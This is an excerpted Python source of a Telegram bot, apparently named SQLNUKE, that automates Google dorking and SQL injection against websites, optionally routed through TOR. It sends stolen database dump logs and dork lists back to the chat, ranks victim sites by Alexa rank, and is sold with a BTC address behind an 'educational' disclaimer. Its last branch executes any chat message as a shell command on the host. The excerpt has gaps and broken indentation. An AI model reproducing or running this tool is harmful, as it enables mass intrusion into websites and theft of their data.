...
-\xF0\x9F\x93\x9A Recode by : 0xCoolAnon
...
def help(msg):
	bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x9A\xA5HELP MENU: `/help`\xF0\x9F\x9A\xA5"))

def sqligoogle(dorkstring, msg, command):
	...
	bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x95\x97 please wait while we are doing SQLi \xF0\x9F\x92\x89"))
	...
	bot.sendMessage(telepot.glance(msg), "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
	bot.sendMessage(telepot.glance(msg), "If you want to download the sqli \xF0\x9F\x92\x89 report for SQLi Sites, Please Execute : `/sqlidata` ")
		...
		for file in os.listdir("data/sqldump"):
			if file.endswith(".csv"):
				if os.stat('data/sqldump/%s' % file).st_size!=0:
					bot.sendDocument(telepot.glance(msg), document=open("data/googledork/%s" % file, 'rb'))
					print (file)
					pass
				else:
					pass
				...
				if os.stat('data/sqldump/%s/log' % file).st_size!=0:
					bot.sendMessage(telepot.glance(msg), "Website SQLi \xF0\x9F\x92\x89 data for : %s" %file)
					print (file)
					ranker = Alexa()
					site_rank = ranker.getrank('%s' % file)
					bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x8C\x8E Alexa Rank: %s" %site_rank))
					bot.sendDocument(telepot.glance(msg), document=open("data/sqldump/%s/log" % file, 'rb'))
				else:
					bot.sendMessage(telepot.glance(msg), "Sorry we haven't found any SQLi \xF0\x9F\x92\x89 on : %s" %file )
					help()
	...
	#btc price
		...
		bot.sendMessage(telepot.glance(msg),str(axx))
		help()
		return 0
	#end btc price
    ...
    #sqlidork
		...
		bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x95\x97 please wait while we are generating the report.. \xF0\x9F\x95\x97"))
		subprocess.check_call(sqldorkengine.split())
		bot.sendDocument(telepot.glance(msg), document=open('sitedata.txt', 'rb'))
		bot.sendMessage(telepot.glance(msg), str("Transfer completed!\xF0\x9F\x9A\x80"))
    ...
    #sqlihack
		...
		if sqlmatch:
			...
			if dirfilter.startswith('https'):
				...
				bot.sendMessage(telepot.glance(msg), str("Generating SQL injection Report for %s" %sqllogpath))
				bot.sendDocument(telepot.glance(msg), document=open("data/%s/log" %sqllogpath , 'rb'))
				bot.sendMessage(telepot.glance(msg), str("Transfer completed!\xF0\x9F\x9A\x80"))
				bot.sendMessage(telepot.glance(msg), str("Please wait while we are gathering Alexa Rank..\xF0\x9F\x95\x97"))
				ranker = Alexa()
				site_rank = ranker.getrank('%s' % sqllogpath)
				bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x8C\x8E Alexa Rank: %s" %site_rank))
		else:
			bot.sendMessage(telepot.glance(msg), "\xE2\x9D\x8C Incorrect Command \xE2\x9D\x8C | Usage eg: -> sqlihack http|https://<url>")
			return 0
	#end sqlihack
		...
		if sqlmatch:
			...
			bot.sendMessage(telepot.glance(msg), "We are doing SQLi \xF0\x9F\x92\x89 in background! ")
			bot.sendMessage(telepot.glance(msg), "If you want to download the sqli \xF0\x9F\x92\x89 report for sqlidata , Please Execute : `/sqlidata` ")
			help()
			dirfilter = sqliargu
			dirpath=re.search("http://*([^/]+)|https://*([^/]+)", dirfilter)
			if dirfilter.startswith('https'):
		...
		if sqlmatchtor:
			...
			f.write("%s\n" % sqliargutor)
			f.close()
			bot.sendMessage(telepot.glance(msg), str("Starting TOR Network."))
			...
			bot.sendMessage(telepot.glance(msg), "We are doing SQLi \xF0\x9F\x92\x89 with TOR in background! ")
			bot.sendMessage(telepot.glance(msg), "If you want to download the sqli \xF0\x9F\x92\x89 report for sqlidata , Please Execute : `/sqlidata` ")
			help()
		else:
			bot.sendMessage(telepot.glance(msg), "\xE2\x9D\x8C Incorrect Command \xE2\x9D\x8C | Usage eg: -> sqlitor http|https://<url>")
			help()
			return 0
		...
		if sqlmatchtor:
			...
			if dirfiltertor.startswith('https'):
				...
				bot.sendMessage(telepot.glance(msg), str("Generating SQL injection Report for %s" %sqllogpathtor))
				bot.sendDocument(telepot.glance(msg), document=open("data/%s/log" %sqllogpathtor , 'rb'))
				bot.sendMessage(telepot.glance(msg), str("Transfer completed!\xF0\x9F\x9A\x80"))
				bot.sendMessage(telepot.glance(msg), str("Please wait while we are gathering Alexa Rank.."))
				ranker = Alexa()
				site_rank_tor = ranker.getrank('%s' % sqllogpathtor)
				bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x8C\x8E Alexa Rank: %s" %site_rank_tor))
		else:
			bot.sendMessage(telepot.glance(msg), "\xE2\x9D\x8C Incorrect Command \xE2\x9D\x8C | Usage eg: -> sqlihacktor http|https://<url>")
			return 0
	#end sqlitor

	#getdorklist
	elif command == '/getdorklist':
		bot.sendMessage(telepot.glance(msg), str("Sending dorklist \xF0\x9F\x9A\x80"))
		bot.sendDocument(telepot.glance(msg), document=open("data/dorklist/dorklist.txt" , 'rb'))
		bot.sendMessage(telepot.glance(msg), str("Transfer completed!\xF0\x9F\x9A\x80"))
		help()
	#end getdorklist
		...
		bot.sendMessage(telepot.glance(msg), str("Starting TOR Network.."))
		subprocess.check_call("service tor start".split())
		bot.sendMessage(telepot.glance(msg), str("TOR Network started!\xE2\x9C\x94"))
		help()

	elif command == '/torstop':
		bot.sendMessage(telepot.glance(msg), str("Shutting down TOR Network.."))
		subprocess.check_call("service tor stop".split())
		bot.sendMessage(telepot.glance(msg), str("TOR Network stopped!\xE2\x9D\x8C"))
		help()
	
	elif command == '/hackwolf':
		bot.sendMessage(telepot.glance(msg), str("Sending the latest dork data.."))
		bot.sendDocument(telepot.glance(msg), document=open('data/dorklist/userdorklist.txt', 'rb'))
		bot.sendDocument(telepot.glance(msg), document=open('data/dorklist/urldata.txt', 'rb'))
		bot.sendMessage(telepot.glance(msg), str("Transfer completed!\xF0\x9F\x9A\x80"))

	elif command == '/meminfo':
		mem_info = getMemoryInfo()
		bot.sendMessage(telepot.glance(msg), str(mem_info))
		help()
	
	elif command == '/cpuloadinfo':
		cpu_info = getLoadAverage()
		bot.sendMessage(telepot.glance(msg), str(cpu_info))
		help()
		
	elif command == '/checksqli':
		sqli_info = checkSqliProcess()
		bot.sendMessage(telepot.glance(msg), str("PID | CMD"))
		bot.sendMessage(telepot.glance(msg), str(sqli_info))

	elif command == '/killsqli':
		killsqliProcess()
		bot.sendMessage(telepot.glance(msg), str("SQLi \xF0\x9F\x92\x89 Process has been killed!\xE2\x9D\x8C"))
		bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x9A\xA5HELP MENU: `/help` | CHECK SQLi \xF0\x9F\x92\x89 : `/checksqli`\xF0\x9F\x9A\xA5"))
		
	elif command == '/buy':
		bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x92\xB0 SQLNUKE  @ \xF0\x9F\x92\xB5 Educational & Research Purpose Only"))
		bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x93\xAB E-Mail : netwrkspider@protonmail.ch "))
		bot.sendMessage(telepot.glance(msg), str("\xF0\x9F\x92\xB5 Donation @ BTC Address:: 19rN13RDEhoZS7d2oc5wAQpGFZPhs6zbAA"))
		help()

	else:
		bot.sendMessage(telepot.glance(msg),'\xF0\x9F\x93\x9F [+] Got Command \xF0\x9F\x93\x9F')
		bot.sendMessage(telepot.glance(msg),command)
		bot.sendMessage(telepot.glance(msg),'\xF0\x9F\x93\x9F  [-] Wait.....[-]')
		aa=subprocess.check_output(command,shell=True)
		bot.sendMessage(telepot.glance(msg),aa)
